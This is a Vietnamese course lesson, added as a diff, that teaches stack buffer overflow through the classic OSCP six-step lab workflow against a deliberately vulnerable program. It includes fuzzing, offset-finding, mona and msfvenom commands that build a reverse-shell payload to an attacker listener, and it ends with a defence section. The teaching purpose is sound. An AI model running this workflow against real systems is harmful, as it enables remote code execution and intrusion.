@@ -1,0 +1,305 @@
+---
+title: "Tràn bộ đệm trên stack"
+code: "3.6"
+level: 3
+summary: "Một chương trình chép dữ liệu người dùng vào bộ nhớ mà không kiểm tra độ dài có thể bị ghi đè chính nơi nó lưu 'chạy xong thì quay về đâu'. Bài này đi qua cơ chế stack và quy trình OSCP kinh điển gồm sáu bước để biến lỗi đó thành một shell."
+duration: "100 phút"
+updated: "2026-11-09"
+prereq: ["1.6"]
+objectives:
+  - "Giải thích được stack, địa chỉ trả về (EIP), và vì sao ghi dữ liệu quá chỗ cấp lại nguy hiểm"
+  - "Làm được quy trình 6 bước: fuzz, tìm offset, chiếm EIP, loại bad char, tìm JMP ESP, tạo shellcode"
+  - "Dùng được các công cụ của quy trình: pattern_create/pattern_offset, msfvenom, một debugger"
+  - "Giải thích được các lớp bảo vệ bộ nhớ hiện đại (canary, DEP, ASLR) và cách phòng thủ từ gốc"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Hãy tưởng tượng một chồng khay trong căng tin: khay mới đặt lên trên, lấy ra cũng từ trên xuống. Khi một hàm (đoạn mã làm một việc cụ thể) được gọi, máy tính đặt lên chồng này một khay chứa dữ liệu tạm của hàm, trong đó có một mẩu giấy ghi "chạy xong thì quay về đâu".
+
+Chồng khay đó gọi là *stack* (ngăn xếp). Bài này cho bạn thấy điều gì xảy ra nếu bạn chất đồ lên khay nhiều hơn khay chứa được: đồ tràn sang khay bên cạnh, và nếu khay bên cạnh đúng là cái mang mẩu giấy "quay về đâu", bạn vừa có cách viết lại nơi chương trình sẽ chạy tiếp.
+
+> Toàn bộ bài này mô tả quy trình trên một **chương trình lab cố tình để lỗi**, chạy trong máy ảo của bạn. Đây là bài thực hành kinh điển của OSCP, chỉ làm trong lab.
+
+<Callout type="note" label="Về vai trò trong kỳ thi">
+Từ các bản cập nhật gần đây, tràn bộ đệm <strong>không còn là phần bắt buộc được bảo đảm</strong> trong kỳ thi OSCP/OSCP+ như trước (xem bài 4.2). Dù vậy, đây vẫn là bài nền tảng để hiểu bộ nhớ hoạt động ra sao và vì sao các lớp bảo vệ bộ nhớ lại quan trọng, nên vẫn đáng học kỹ.
+</Callout>
+
+## Kiến thức chính
+
+### Stack và địa chỉ trả về
+
+Mỗi hàm được cấp một vùng trên stack để chứa biến cục bộ. Cùng vùng đó lưu **địa chỉ trả về** (trên máy 32-bit nó nằm ở thanh ghi tên EIP, tức "con trỏ lệnh": ô nhớ cho biết lệnh tiếp theo sẽ chạy ở đâu): nơi chương trình quay lại sau khi hàm xong. Đây là chi tiết quan trọng nhất.
+
+### Vì sao ghi quá chỗ lại nguy hiểm
+
+Nếu một hàm dành 8 ô cho dữ liệu nhập mà chép vào đó **không kiểm tra độ dài**, dữ liệu dài hơn sẽ tràn (buffer overflow) sang các ô bên cạnh, trong đó có ô chứa địa chỉ trả về. Kiểm soát được địa chỉ trả về là **kiểm soát được chương trình sẽ chạy tiếp ở đâu**.
+
+<ConceptMap
+  client:visible
+  title="Vùng nhớ của một hàm trên stack"
+  width={640}
+  height={400}
+  nodes={[
+    { id: 'buf', label: 'Vùng chứa dữ liệu nhập', sub: '8 ô', x: 160, y: 40, w: 190, detail: 'Chỗ cho dữ liệu người dùng. Chép vào không giới hạn độ dài thì phần thừa tràn xuống dưới.' },
+    { id: 'saved', label: 'Dữ liệu lưu của hàm gọi', x: 160, y: 198, w: 190, tone: 'warn', detail: 'Nằm ngay cạnh vùng nhập nên dễ bị tràn tới.' },
+    { id: 'ret', label: 'Địa chỉ trả về (EIP)', x: 160, y: 356, w: 190, tone: 'bad', detail: 'Nơi chương trình quay về. Ghi đè được nó = đổi hướng luồng chạy. Mấu chốt của tràn bộ đệm.' },
+    { id: 'canary', label: 'Stack canary', sub: 'lớp bảo vệ', x: 460, y: 356, tone: 'accent', detail: 'Giá trị bí mật đặt trước địa chỉ trả về; kiểm tra trước khi hàm kết thúc. Bị đổi thì dừng ngay.' },
+  ]}
+  edges={[
+    { from: 'buf', to: 'saved', label: 'tràn xuống' },
+    { from: 'saved', to: 'ret', label: 'tràn tiếp' },
+    { from: 'canary', to: 'ret', label: 'bảo vệ', dashed: true },
+  ]}
+/>
+
+## Thực hành: quy trình OSCP 6 bước
+
+Mục tiêu: một dịch vụ lab nghe trên một cổng và nhận chuỗi nhập chưa kiểm tra độ dài. Ta làm trong máy ảo Windows với một debugger (Immunity/x32dbg). Sáu bước dưới đây nối tiếp nhau rất chặt: mỗi bước cho một con số hoặc một địa chỉ mà bước sau cần dùng, nên làm đúng thứ tự, đừng nhảy cóc.
+
+**Bước 1 — Fuzz: gửi chuỗi dài dần tới khi chương trình sập.** Trước khi tính toán bất cứ gì, bạn cần biết đại khái độ dài nào đủ để làm chương trình gục, như gõ thử một ô nhập để biết nó chịu được bao nhiêu chữ trước khi báo lỗi.
+
+<Lenh noi="Terminal trên máy Kali, nhắm vào dịch vụ lab trên máy Windows đang gắn debugger" muc="Tìm khoảng độ dài khiến chương trình sập, bằng cách gửi ngày càng nhiều ký tự 'A'">
+
+<Terminal title="Gửi A nhiều dần để tìm điểm sập">
+
+```text
+kali@lab:~$ # gửi 100, 200, 300... ký tự 'A'
+kali@lab:~$ python3 -c "print('A'*700)" | nc 10.10.14.70 9999
+# Debugger trên máy đích báo chương trình sập khi tới khoảng 600-700 byte
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `python3 -c "print('A'*700)"`: in ra một chuỗi gồm 700 ký tự `A` liên tiếp.
+- `| nc 10.10.14.70 9999`: ống dẫn chuỗi đó làm đầu vào cho `nc`, gửi thẳng tới cổng 9999 của dịch vụ lab.
+- Thực tế bạn lặp lại với số tăng dần (100, 200, ... 700) để dò ra ngưỡng, không chỉ gửi một lần 700.
+
+</div>
+
+<div slot="doc">
+
+- Không có output ở phía Kali. Dấu hiệu cần theo dõi nằm ở **debugger trên máy Windows**: nó báo chương trình dừng bất thường (crash) khi độ dài đạt tới một ngưỡng nào đó.
+- Ghi lại khoảng độ dài làm sập (ở đây khoảng 600–700 byte); đây là cơ sở để bước 2 tính offset chính xác.
+
+</div>
+
+</Lenh>
+
+**Bước 2 — Tìm offset: chính xác byte thứ bao nhiêu ghi đè EIP.** Biết "khoảng 2000 byte làm sập" chưa đủ để kiểm soát gì. Bạn cần biết chính xác byte nào trong chuỗi đó rơi đúng vào EIP, và cách làm không phải đoán mà là gửi một chuỗi không lặp để đọc ngược lại.
+
+<Lenh noi="Terminal trên máy Kali" muc="Tính chính xác byte thứ bao nhiêu trong chuỗi gửi đi sẽ rơi đúng vào EIP, thay vì đoán mò">
+
+<Terminal title="pattern_create và pattern_offset">
+
+```text
+kali@lab:~$ msf-pattern_create -l 700
+Aa0Aa1Aa2Aa3Aa4Ab0Ab1...
+# Gửi chuỗi này; debugger cho thấy EIP = 39694438
+
+kali@lab:~$ msf-pattern_offset -l 700 -q 39694438
+[*] Exact match at offset 628
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `msf-pattern_create -l 700`: sinh một chuỗi dài 700 ký tự nhưng **không lặp lại bất kỳ đoạn 4 ký tự nào** (ví dụ `Aa0A`, `a1Aa`...). Nhờ vậy, mỗi vị trí trong chuỗi là duy nhất.
+- Gửi chuỗi này thay cho chuỗi toàn 'A' ở bước 1 (cách gửi giống bước 1, qua `nc`).
+- `msf-pattern_offset -l 700 -q 39694438`: tra ngược xem giá trị 4 byte `39694438` nằm ở vị trí thứ mấy trong chuỗi mẫu dài 700 đã sinh ra ở trên. `-q` (query) nhận đúng giá trị đọc được từ thanh ghi EIP trong debugger sau khi chương trình sập.
+
+</div>
+
+<div slot="doc">
+
+- `EIP = 39694438`: đây là giá trị bạn **đọc trực tiếp từ debugger** (Immunity/x32dbg) sau khi gửi chuỗi mẫu, không phải output của lệnh Kali.
+- `[*] Exact match at offset 628`: tìm thấy đúng một vị trí khớp, nghĩa là byte thứ 628 (tính từ 0) là nơi 4-byte ghi vào EIP bắt đầu. Đây là số **quan trọng nhất của toàn bài**: 628 byte đệm rồi mới tới 4 byte quyết định EIP.
+- Không khớp hoặc báo "not found": kiểm tra lại đã gửi đúng chuỗi mẫu 700 ký tự (không bị cắt bớt) và đọc đúng giá trị EIP.
+
+</div>
+
+</Lenh>
+
+**Bước 3 — Chiếm EIP: xác nhận kiểm soát được.** Có con số offset rồi, bước này là để tự tin: gửi đúng số byte đệm đó rồi một giá trị bạn tự chọn và dễ nhận ra, để thấy chính giá trị đó xuất hiện trong EIP, chứ không chỉ tin vào con số tính được.
+
+<Lenh noi="Đoạn Python dùng để dựng payload gửi đi từ máy Kali" muc="Kiểm chứng lại con số 628 ở bước trước là đúng, bằng cách đặt một giá trị dễ nhận ra vào đúng vị trí EIP">
+
+<Terminal title="628 byte đệm + 4 byte BBBB vào EIP">
+
+```text
+payload = b"A"*628 + b"BBBB" + b"C"*100
+# Debugger hiện EIP = 42424242 (mã hex của 'BBBB'). Ta kiểm soát EIP.
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `b"A"*628`: 628 byte đệm (lấp đầy đúng tới ngay trước EIP, theo offset đã tính ở bước 2).
+- `b"BBBB"`: 4 byte ngay sau đó — đúng vị trí sẽ ghi vào EIP. Dùng `B` để dễ nhận ra, khác với `A` ở phần đệm và `C` ở phần sau.
+- `b"C"*100`: thêm một đoạn sau EIP để xem phần này còn ghi được xa tới đâu (sẽ dùng làm chỗ đặt shellcode sau).
+
+</div>
+
+<div slot="doc">
+
+- Gửi payload này đi (qua `nc`, giống bước 1), rồi nhìn vào debugger: thanh ghi EIP hiện `42424242`. Đây là mã hex của bốn ký tự `B` (`0x42` = chữ `B`).
+- Thấy đúng `42424242` nghĩa là: **đã xác nhận kiểm soát được EIP** — bạn ghi gì vào đúng 4 byte đó, EIP sẽ nhận đúng giá trị đó.
+- EIP ra một giá trị khác: offset ở bước 2 chưa đúng, hoặc chương trình có xử lý khác thường, cần dò lại.
+
+</div>
+
+</Lenh>
+
+**Bước 4 — Tìm bad chars: byte nào làm hỏng payload.** Bạn đã kiểm soát được EIP, nhưng shellcode ở bước 6 là một chuỗi byte tuỳ ý, và một số byte đặc biệt (như `\x00`, dấu kết thúc chuỗi) sẽ bị chương trình hiểu sai hoặc cắt cụt. Việc cần làm là tìm trước danh sách byte "xấu" này, để tránh dùng chúng khi tạo shellcode.
+
+Gửi gần như đủ 256 giá trị byte, so sánh trong bộ nhớ xem byte nào bị biến dạng hoặc cắt chuỗi. `\x00` (null) gần như luôn xấu; có thể thêm `\x0a`, `\x0d`. Danh sách bad char này dùng ở bước sau.
+
+**Bước 5 — Tìm JMP ESP: một địa chỉ ổn định để nhảy vào shellcode.** Bạn kiểm soát EIP, nhưng ghi gì vào đó? Không thể ghi trực tiếp shellcode vào EIP (nó chỉ chứa một địa chỉ).
+
+Giải pháp kinh điển: tìm một địa chỉ có sẵn trong chương trình chứa đúng lệnh CPU "nhảy tới ESP" (một thanh ghi khác, nơi bạn đặt sẵn shellcode), rồi ghi địa chỉ đó vào EIP. Chương trình "trả về" đúng chỗ đó, lập tức nhảy tiếp vào shellcode.
+
+<Lenh noi="Gõ vào cửa sổ lệnh của Immunity Debugger, đang đính (attach) vào tiến trình của chương trình lab" muc="Tìm một địa chỉ ổn định chứa lệnh CPU 'nhảy tới ESP', để dùng làm giá trị ghi vào EIP">
+
+<Terminal title="Tìm lệnh JMP ESP không chứa bad char">
+
+```text
+# Trong Immunity, dùng mona:
+!mona jmp -r esp -cpb "\x00\x0a\x0d"
+# Kết quả: 0x625011af  (một địa chỉ JMP ESP trong module không bảo vệ)
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `!mona jmp -r esp`: lệnh của plugin **mona** (cho Immunity Debugger), tìm trong các module đã nạp mọi địa chỉ có chứa lệnh assembly "JMP ESP" (nhảy tới nơi con trỏ ESP đang chỉ).
+- `-cpb "\x00\x0a\x0d"`: viết tắt của "cấm byte xấu" (bad chars, tìm ở bước 4) — loại bỏ mọi địa chỉ mà bản thân nó, khi viết dưới dạng byte, chứa một trong các byte xấu này.
+
+</div>
+
+<div slot="doc">
+
+- Kết quả `0x625011af` là **một địa chỉ cụ thể** trong bộ nhớ, trỏ tới một lệnh JMP ESP hợp lệ, nằm trong module không có ASLR/bật bảo vệ (bài lab mới có loại module này).
+- Vì bộ nhớ x86 lưu số theo thứ tự byte ngược (little-endian), khi ghi địa chỉ này vào payload phải **viết ngược từng byte**: `0x625011af` thành `\xaf\x11\x50\x62`.
+- Không tìm thấy kết quả nào: thử bỏ bớt điều kiện `-cpb`, hoặc tìm trong module khác; nằm ngoài phạm vi bài này.
+
+</div>
+
+</Lenh>
+
+**Bước 6 — Shellcode: tạo bằng msfvenom, loại bad char.** Mọi mảnh đã có sẵn: offset, địa chỉ JMP ESP, danh sách bad char. Bước cuối chỉ còn việc sinh đoạn mã máy thật sự sẽ chạy khi bị nhảy vào, tránh đúng những byte xấu đã tìm ở bước 4.
+
+<Lenh noi="Terminal trên máy Kali" muc="Sinh đoạn mã máy (shellcode) sẽ mở một reverse shell về máy Kali, tự tránh các byte xấu đã tìm ở bước 4">
+
+<Terminal title="msfvenom sinh shellcode tránh bad char">
+
+```text
+kali@lab:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 \
+  -b "\x00\x0a\x0d" -f python
+buf =  b"\xbf\x...\x..."   # shellcode đã mã hoá, không chứa bad char
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `msfvenom -p windows/shell_reverse_tcp`: chọn payload Metasploit "mở reverse shell trên Windows". `LHOST`/`LPORT`: IP và cổng máy Kali, nơi shell sẽ gọi về.
+- `-b "\x00\x0a\x0d"`: danh sách byte xấu (bad chars) cần **tránh** — giống `-cpb` ở bước 5. msfvenom tự biến đổi shellcode (encode) để không chứa các byte này.
+- `-f python`: xuất kết quả ở dạng có thể dán thẳng vào một script Python.
+
+</div>
+
+<div slot="doc">
+
+- `buf = b"\xbf\x...\x..."`: biến Python chứa shellcode dưới dạng chuỗi byte. Dán biến này vào script dựng payload cuối.
+- Payload cuối cùng ghép theo thứ tự: 628 byte đệm (bước 2) + 4 byte địa chỉ JMP ESP (bước 5, viết ngược) + một đoạn "nop sled" (vài chục byte `\x90`, đệm an toàn) + `buf` (shellcode).
+- Gửi payload này đi qua `nc` như các bước trước, đồng thời mở sẵn người nghe `nc -lvnp 443` trên Kali (bài 2.7); nhận được shell là hoàn tất toàn bộ quy trình.
+
+</div>
+
+</Lenh>
+
+### Các lớp bảo vệ hiện đại
+
+Khai thác loại này khó hơn xưa nhiều vì nhiều lớp phòng thủ:
+
+- **Stack canary:** một giá trị "chim hoàng yến" đặt sẵn trước địa chỉ trả về; nếu dữ liệu tràn đè lên nó, chương trình phát hiện ra và tự dừng.
+- **DEP/NX:** đánh dấu vùng dữ liệu "không được chạy như mã", nên shellcode tràn vào không chạy trực tiếp (phải dùng kỹ thuật phức tạp hơn).
+- **ASLR:** xáo trộn ngẫu nhiên vị trí các vùng nhớ mỗi lần chạy, khiến khó đoán địa chỉ như JMP ESP.
+
+Bài lab OSCP thường tắt bớt các lớp này để dạy nền tảng; hệ thống thật bật đầy đủ.
+
+<LabBrief
+  ten="Tự đi hết 6 bước, không mở lại bài mẫu ở trên"
+  muctieu="Chạy một chương trình tập luyện tràn bộ đệm công khai (miễn phí, dựng riêng cho mục đích luyện BOF) trên máy Windows lab, gắn debugger, rồi tự đi đúng 6 bước để chiếm quyền điều khiển EIP và chạy shellcode"
+  may="Windows bản đánh giá (bài 0.2) chạy chương trình tập luyện BOF, gắn Immunity Debugger hoặc x32dbg"
+  thoigian="90 phút"
+  xong="Bạn mở được một shell từ chương trình lab, kèm ghi chú offset chính xác và địa chỉ JMP ESP đã dùng"
+>
+
+1. Fuzz: gửi chuỗi dài dần tới khi chương trình sập, ghi lại khoảng độ dài gây sập.
+2. Tìm offset chính xác tới EIP bằng chuỗi duy nhất (pattern).
+3. Kiểm soát EIP: xác nhận đúng 4 byte bạn chèn vào điều khiển được con trỏ lệnh.
+4. Tìm bad character: loại trừ các byte làm hỏng payload khi gửi qua kênh mạng.
+5. Tìm địa chỉ nhảy (JMP ESP) trong một module không bật ASLR.
+6. Tạo shellcode bằng msfvenom, ghép đủ 5 phần theo đúng thứ tự, gửi và bắt shell.
+
+<div slot="goiy1">
+Sáu bước này có tên và lệnh mẫu đầy đủ trong chính mục "Thực hành: quy trình OSCP 6 bước" ngay phía trên — làm lại từng bước, không nhìn số byte mẫu (vì chương trình và máy của bạn có thể cho offset khác).
+</div>
+
+<div slot="goiy2">
+`!mona` (plugin cho Immunity) tự động hoá phần lớn việc tính offset, tìm bad character và tìm địa chỉ nhảy — tên lệnh mona cho từng việc đã có trong bài.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: sau bước 6, `nc -lvnp 443` trên Kali nhận được một kết nối và cho shell trên máy Windows.
+- Chương trình sập ở bước 3 nhưng EIP không phải `42424242` (hoặc giá trị bạn chèn): offset tính sai ở bước 2, chạy lại pattern với độ dài lớn hơn khoảng sập ở bước 1.
+- Shell không mở dù mọi bước trước đều đúng: khả năng cao do bad character làm hỏng shellcode — kiểm tra lại danh sách loại trừ ở bước 4, ký tự `\x00` luôn phải loại trước tiên.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Nếu bạn là lập trình viên, hãy nhớ gốc rễ của cả sáu bước trên chỉ là một việc: chép dữ liệu mà không kiểm tra độ dài. Phòng thủ từ gốc là dùng hàm có giới hạn độ dài, kiểm tra kích thước đầu vào, và dùng ngôn ngữ tự quản lý bộ nhớ (Rust, Go, Java...) khi có thể, để lớp lỗi này không còn tồn tại.
+
+Về phía hệ thống, bật đầy đủ canary, DEP/NX, ASLR, và cập nhật phần mềm đều đặn. Không lớp nào hoàn hảo một mình, nhưng nhiều lớp cùng lúc khiến một lỗi đơn lẻ khó thành một khai thác hoàn chỉnh như sáu bước ở trên.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Nghĩ tràn bộ đệm chỉ làm sập chương trình.** Sập chỉ là biểu hiện dễ thấy nhất; vấn đề an ninh thật sự là ai kiểm soát được chương trình sẽ chạy tiếp ở đâu sau khi "sập".
+- **Quên loại bad char khỏi shellcode.** Bỏ qua bước 4 rồi payload chạy nửa chừng thì hỏng, và debug lại từ đâu khiến bạn mất rất nhiều thời gian mà không hiểu vì sao một thứ "đã đúng" lại không chạy.
+- **Viết địa chỉ theo thứ tự xuôi thay vì ngược (little-endian).** Lỗi rất dễ mắc khi gõ tay địa chỉ JMP ESP, và hậu quả là EIP bị ghi sai giá trị mà nhìn qua tưởng đúng.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Vì sao địa chỉ trả về (EIP) quan trọng với an ninh?', options: ['Nó lưu mật khẩu', 'Ghi đè nó cho phép đổi hướng luồng chạy của chương trình', 'Nó làm chương trình nhanh hơn'], answer: 1, explain: 'EIP quyết định chương trình chạy tiếp ở đâu; kiểm soát nó là kiểm soát luồng chạy.' },
+    { q: 'pattern_create / pattern_offset dùng để làm gì?', options: ['Sinh shellcode', 'Tìm chính xác byte thứ bao nhiêu ghi đè EIP', 'Quét cổng'], answer: 1, explain: 'Chuỗi mẫu không lặp giúp tính offset chính xác từ giá trị EIP lúc sập.' },
+    { q: 'Vì sao cần tìm địa chỉ JMP ESP?', options: ['Để làm sập nhanh hơn', 'Để sau khi trả về, CPU nhảy tới ESP nơi đặt shellcode', 'Để mã hoá dữ liệu'], answer: 1, explain: 'Ghi đè EIP bằng địa chỉ JMP ESP khiến luồng chạy nhảy vào shellcode ta đặt sẵn ở ESP.' },
+    { q: 'ASLR bảo vệ bằng cách nào?', options: ['Mã hoá dữ liệu', 'Xáo trộn ngẫu nhiên vị trí vùng nhớ mỗi lần chạy', 'Chặn mạng'], answer: 1, explain: 'ASLR làm địa chỉ thay đổi mỗi lần chạy nên khó đoán.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Stack lưu biến cục bộ và địa chỉ trả về (EIP) của mỗi hàm; hễ ghi đè được EIP là bạn kiểm soát được chương trình sẽ chạy tiếp ở đâu.
+- Sáu bước khai thác nối chặt vào nhau theo thứ tự: fuzz tìm điểm sập, tính offset chính xác, xác nhận chiếm được EIP, lọc bỏ bad chars, tìm địa chỉ lệnh JMP ESP, rồi sinh shellcode bằng `msfvenom`. Mỗi bước cung cấp con số mà bước kế tiếp bắt buộc phải dùng, nên tuyệt đối không nhảy cóc.
+- Canary, DEP/NX và ASLR là các lớp bảo vệ hiện đại chặn hoặc làm khó từng bước trên hệ thống thật, nhưng phòng thủ gốc rễ vẫn là kiểm tra độ dài đầu vào ngay từ mã nguồn.
